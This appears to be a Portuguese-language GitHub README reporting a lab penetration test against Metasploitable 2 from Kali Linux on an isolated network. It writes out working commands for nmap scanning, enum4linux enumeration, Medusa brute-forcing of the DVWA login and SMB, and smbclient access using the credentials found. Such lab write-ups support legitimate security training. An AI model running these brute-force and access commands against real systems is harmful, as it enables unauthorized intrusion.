#  Relatório de testes praticos em ambiente vulneravel

Projeto prático desenvolvido para simulação completa de um teste de segurança (*Pentest*), cobrindo reconhecimento, enumeração, força bruta em aplicações web e acesso remoto a sistemas através do ambiente controlado **Metasploitable 2**.

---

## Arquitetura do Laboratório

* **Máquina Atacante:** Kali Linux (IP: `192.168.56.101`)
* **Máquina Alvo:** Metasploitable 2 (IP: `192.168.56.102`)
* **Tipo de Rede:** Host-Only (Isolada para testes de segurança)

---
## Ferramentas utilizadas
*  Medusa
* FTP
* SMB
* DVWA

---

##  Etapas da Execução Prática

### 1. Preparacao dos ambientes
* Instale o VirtualBox
* Metasploitable 2

### 2. Configurar rede
* Vá em Configurações > Rede
* Selecione:
  * Modo: Host-Only Adapter

### 1. Reconhecimento de Portas (Nmap)
Varredura inicial para identificar os serviços e portas abertas na máquina alvo:
```bash
nmap -sV 192.168.56.102
```
### 2. Enumeração do Sistema (Enum4linux)
Recolha avançada de informações sobre o sistema operativo, utilizadores e partilhas SMB disponíveis na rede:
```bash
enum4linux -A 192.168.56.102 | tee results.txt
```
### 3. Criação de Wordlists
Configuração dos ficheiros de texto contendo as combinações de utilizadores e palavras-passe para os testes:
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nadmin\nmsfadmin\nuser" > password.txt
```
### 4. Força Bruta na Aplicação Web
Execução do ataque de força bruta direcionado ao formulário de autenticação do DVWA utilizando o módulo HTTP do Medusa:
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
### 5. Força Bruta no Serviço SMB
Utilização das mesmas wordlists para efetuar um ataque de força bruta direcionado ao serviço SMB (compartilhamento/workgroup):
Bash
```bash
medusa -h 192.168.56.102 -U users.txt -P password.txt -M smb
```
### 6. Acesso Remoto via SMB
Utilização das credenciais válidas identificadas para aceder aos recursos partilhados do servidor alvo:
```bash
smbclient //192.168.56.102/tmp -U msfadmin
```
---
### Mapeamento de Portas e Serviços (Nmap)
<img width="1366" height="672" alt="Screenshot_2026-10-09_19_46_01" src="https://github.com/user-attachments/assets/b12b0883-1a8c-4015-b12b-9c4c771bfbce" />

---

### Validação de Credenciais por Força Bruta (Medusa)
<img width="1366" height="672" alt="Screenshot_2026-10-11_13_06_01 (1)" src="https://github.com/user-attachments/assets/8a2a3533-05e5-41a5-b21d-036b304ce5d2" />

